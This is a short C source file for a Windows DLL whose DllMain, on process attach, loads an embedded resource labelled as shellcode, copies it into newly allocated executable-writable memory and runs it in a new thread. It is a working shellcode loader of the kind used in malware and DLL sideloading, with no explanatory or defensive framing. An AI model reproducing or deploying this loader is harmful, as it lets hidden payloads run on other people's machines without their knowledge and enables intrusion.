#include <Windows.h>
#include "resource.h"
void functino()
{
		HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_MENU1), "info");
		DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
		HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeResource);

		PVOID remoteBuffer = VirtualAllocEx(GetCurrentProcess(), NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(GetCurrentProcess(), remoteBuffer, shellcodeResourceData, shellcodeSize, NULL);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		functino();
		return FALSE;

        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
